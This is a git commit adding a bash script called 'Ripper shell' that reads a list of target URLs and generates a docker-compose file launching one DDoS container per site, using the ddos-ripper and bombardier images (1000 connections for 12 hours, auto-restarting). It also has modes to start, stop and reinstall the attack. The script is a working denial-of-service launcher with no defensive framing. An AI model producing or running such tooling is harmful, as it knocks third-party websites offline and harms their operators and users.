ae92d0a469f20014d13da14faefa5649ab64422d
Eugene <>
2022-02-27 19:02:22 +0200

    Initial

---
+++ doit.sh
@@ -0,0 +1,118 @@
+#!/bin/bash
+# Ripper shell v1.0
+
+VERSION='1.0'
+
+print_help () {
+  echo "Usage: os_x_ripper.sh --file urls.txt"
+  echo "--file|-f - filename where urls are located"
+}
+
+print_version () {
+  echo $VERSION
+}
+
+check_dependencies () {
+  if $(docker -v | grep "Docker"); then
+    echo "Please install docker first. https://www.docker.com/products/docker-desktop"
+    exit 1
+  fi
+}
+
+check_params () {
+  if [ -z ${FILE+x} ]; then
+    echo "Filename is unset, please specify filename for urls file"
+    exit 1
+  fi
+}
+
+generate_compose_light () {
+  echo "version: '3'" > docker-compose.yml
+  echo "services:" >> docker-compose.yml
+  counter=1
+  while read -r site_url; do
+    if [ ! -z $site_url ]; then
+      echo "  ddos-runner-$counter:" >> docker-compose.yml
+      echo "    image: alpine/bombardier:latest" >> docker-compose.yml
+      echo "    restart: always" >> docker-compose.yml
+      echo "    command: -c 1000 -d 43200s $site_url" >> docker-compose.yml
+      counter=counter+1
+    fi
+  done < $FILE
+}
+
+generate_compose () {
+  echo "version: '3'" > docker-compose.yml
+    echo "services:" >> docker-compose.yml
+    counter=1
+    while read -r site_url; do
+        if [ ! -z $site_url ]; then
+            echo "  ddos-runner-$counter:" >> docker-compose.yml
+            echo "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
+            echo "    restart: always" >> docker-compose.yml
+            echo "    command: $site_url" >> docker-compose.yml
+            counter=counter+1
+        fi
+    done < $FILE
+}
+
+ripper_start () {
+  echo "Starting ripper attack"
+  docker-compose up -d
+}
+
+ripper_stop () {
+  echo "Stopping ripper attack"
+  docker-compose down
+}
+
+while test -n "$1"; do
+  case "$1" in
+  --help|-h)
+    print_help
+    exit
+    ;;
+  --file|-f)
+    FILE=$2
+    shift
+    ;;
+  --mode|-m)
+    MODE=$2
+    shift
+    ;;
+  *)
+    echo "Unknown argument: $1"
+    print_help
+    exit
+    ;;
+  esac
+  shift
+done
+
+check_dependencies
+check_params
+
+case $MODE in
+  install)
+    generate_compose
+    ripper_start
+    ;;
+  light_install)
+    generate_compose_light
+    ripper_start
+  ;;
+  start)
+    ripper_start
+    ;;
+  stop)
+    ripper_stop
+    ;;
+  reinstall)
+    ripper_stop
+    generate_compose
+    ripper_start
+    ;;
+  *)
+    echo "Wrong mode"
+    exit 1
+esac
